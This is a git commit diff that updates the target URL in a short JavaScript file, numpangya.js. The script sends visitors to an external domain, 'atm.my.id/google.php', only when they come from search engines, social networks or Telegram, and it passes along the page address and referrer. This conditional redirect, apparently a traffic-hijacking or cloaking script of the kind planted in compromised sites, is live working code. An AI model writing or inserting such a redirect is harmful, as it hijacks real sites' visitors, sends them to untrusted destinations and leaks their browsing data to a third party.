afa121436513401c7bfd15c2b79778dacdfa8abc
masanwar89 <74386838+masanwar89@users.noreply.github.com>
2023-11-25 21:55:40 +0700

    Update url

--- numpangya.js
+++ numpangya.js
@@ -1,2 +1,2 @@
-var ars = 'https://goldfieldupc.com';
+var ars = 'https://atm.my.id/google.php';
 if(['.google.', '.bing.', '.yandex.', 'facebook.', 'pinterest.', 'baidu.', 'petalsearch.', 'startpage.', 'xfinity.', 'alohafind.', 'yahoo.', 'duckduckgo.', 'searchbip.', 'wowway.', '.t.', 'telegram.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
